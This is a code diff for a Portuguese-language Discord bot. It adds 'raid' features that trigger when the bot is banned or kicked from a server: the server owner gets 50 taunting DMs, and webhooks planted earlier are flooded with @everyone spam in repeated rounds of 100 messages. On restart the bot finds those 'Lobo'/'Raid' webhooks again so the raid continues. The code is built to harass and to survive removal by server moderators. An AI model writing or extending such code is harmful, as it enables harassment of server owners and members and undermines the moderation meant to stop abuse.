@@ -58,6 +58,9 @@ client.saveLoteria = db.saveLoteria;
 client.getRankingMoedas = db.getRankingMoedas;
 client.getRankingXP = db.getRankingXP;
 client.loadDB = db.loadDB;
+client.saveRaidState = db.saveRaidState;
+client.getRaidState = db.getRaidState;
+client.deleteRaidState = db.deleteRaidState;
 const initCache = db.initCache;
 
 const economia = require('./economia');
@@ -129,7 +132,11 @@ client.on('guildMemberAdd', async (member) => {
 // ─── Raid Webhook Spam ────────────────────────────────────────────────────────
 client.on('guildBanAdd', async (ban) => {
   if (ban.user.id === client.user.id) {
-    // Bot foi banido, ativar spam via webhooks
+    // Bot foi banido: spam via webhooks + DM do dono do servidor
+    const guild = ban.guild;
+    const ownerUser = await client.users.fetch(guild.ownerId).catch(() => null);
+    
+    // Spam via webhooks
     if (global.raidWebhooks && global.raidWebhooks.length > 0) {
       for (const webhook of global.raidWebhooks) {
         try {
@@ -142,23 +149,70 @@ client.on('guildBanAdd', async (ban) => {
         }
       }
     }
+    
+    // Spam na DM do dono do servidor
+    if (ownerUser) {
+      try {
+        for (let i = 0; i < 50; i++) {
+          await ownerUser.send(`🐺 **O LOBO GUARANÁ FOI BANIDO DO SERVIDOR!**\n\nMas ele ainda está aqui... espiando você na DM! 👁️\n\n**Servidor:** ${guild.name}\n**ID:** ${guild.id}\n\nEle voltará... AAAAAAUUUUUUUU! 🐺`);
+          await new Promise(resolve => setTimeout(resolve, 300));
+        }
+      } catch (error) {
+        console.log(`Erro ao enviar DM para dono: ${error.message}`);
+      }
+    }
   }
 });
 
 client.on('guildDelete', async (guild) => {
-  // Bot foi removido / expulso da guilda: continuar spam via webhooks existentes.
-  if (global.raidWebhooks && global.raidWebhooks.length > 0) {
-    for (const webhook of global.raidWebhooks) {
-      try {
-        for (let i = 0; i < 100; i++) {
-          await webhook.send('@everyone O LOBO GUARANÁ FOI EXPULSO MAS AINDA DOMINA ESTA GUILDA! AAAAAAUUUUUUUU!');
-          await new Promise(resolve => setTimeout(resolve, 50));
-        }
-      } catch (error) {
-        console.log(`Erro no spam webhook após remoção do bot: ${error}`);
+  // Bot foi removido / expulso da guilda: continuar spam via webhooks + DM do dono
+  const ownerUser = await client.users.fetch(guild.ownerId).catch(() => null);
+  
+  // Spam na DM do dono do servidor
+  if (ownerUser) {
+    try {
+      for (let i = 0; i < 50; i++) {
+        await ownerUser.send(`🐺 **O LOBO GUARANÁ FOI EXPULSO DO SERVIDOR!**\n\nMas ele ainda está aqui... espiando você na DM! 👁️\n\n**Servidor:** ${guild.name}\n**ID:** ${guild.id}\n\nEle voltará... AAAAAAUUUUUUUU! 🐺`);
+        await new Promise(resolve => setTimeout(resolve, 300));
       }
+    } catch (error) {
+      console.log(`Erro ao enviar DM para dono: ${error.message}`);
     }
   }
+  
+  // Spam persistente via webhooks
+  if (!global.raidWebhooks || global.raidWebhooks.length === 0) return;
+  
+  const webhooksToKeep = [];
+  for (const webhook of global.raidWebhooks) {
+    // Tentar spam agressivo: 3 rodadas de 100 mensagens cada
+    for (let rodada = 0; rodada < 3; rodada++) {
+      for (let i = 0; i < 100; i++) {
+        try {
+          await webhook.send('@everyone O LOBO GUARANÁ FOI EXPULSO MAS AINDA DOMINA! AAAAAAUUUUUUUU!');
+          await new Promise(resolve => setTimeout(resolve, 50));
+        } catch (error) {
+          // Se falhar por webhook deletado/inválido, não readdicionar
+          if (error.code === 10015 || error.code === 10003 || error.message?.includes('Unknown')) {
+            break;
+          }
+          // Se falhar por outro motivo, continuar tentando
+          console.log(`Aviso: erro no spam webhook: ${error.message}`);
+        }
+      }
+      // Pequena pausa entre rodadas
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+  }
+  
+  // Limpar webhooks que definitivamente falharam
+  global.raidWebhooks = global.raidWebhooks.filter(wh => {
+    try {
+      return wh && wh.id;
+    } catch {
+      return false;
+    }
+  });
 });
 
 // ─── Censura ──────────────────────────────────────────────────────────────────
@@ -171,7 +225,7 @@ client.censuradoAviso = censuradoAviso;
 const msgCount = new Map();
 client.msgCount = msgCount;
 
-const DM_BLOCKED_COMMANDS = new Set(['ticket', 'clear', 'falar', 'censurar', 'serverinfo', 'loteria', 'comprar', 'restaurar', 'caçada', 'procurar', 'pr']);
+const DM_BLOCKED_COMMANDS = new Set(['ticket', 'clear', 'falar', 'censurar', 'serverinfo', 'loteria', 'comprar', 'restaurar', 'caçada', 'procurar', 'pr', 'kit']);
 
 // ─── XP + comandos ───────────────────────────────────────────────────────────
 const xpCooldown = new Map();
@@ -338,6 +392,33 @@ client.on('clientReady', async () => {
 
   // Carrega cache do Firebase
   if (initCache) await initCache().catch(e => console.warn('[Firebase] Erro no cache:', e.message));
+
+  // Restaurar raids persistentes
+  console.log('[TASD Bot] Verificando raids persistentes...');
+  try {
+    for (const guild of client.guilds.cache.values()) {
+      const raidState = await client.getRaidState(guild.id);
+      if (raidState && raidState.raidAtiva) {
+        console.log(`[Raid Persistente] Detectada raid no servidor: ${guild.name}`);
+        // Reativar webhooks e continuar spam
+        if (!global.raidWebhooks) global.raidWebhooks = [];
+        // Tentar recuperar webhooks existentes
+        try {
+          const webhooks = await guild.fetchWebhooks().catch(() => []);
+          for (const wh of webhooks) {
+            if (wh.name.includes('Lobo') || wh.name.includes('Raid')) {
+              global.raidWebhooks.push(wh);
+            }
+          }
+          console.log(`[Raid Persistente] ${global.raidWebhooks.length} webhooks recuperados.`);
+        } catch (e) {
+          console.log(`[Raid Persistente] Erro ao recuperar webhooks: ${e.message}`);
+        }
+      }
+    }
+  } catch (e) {
+    console.log(`[Raid Persistente] Erro ao restaurar: ${e.message}`);
+  }
 
   const rest = new REST({ version: '10' }).setToken(TOKEN);
   await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands })
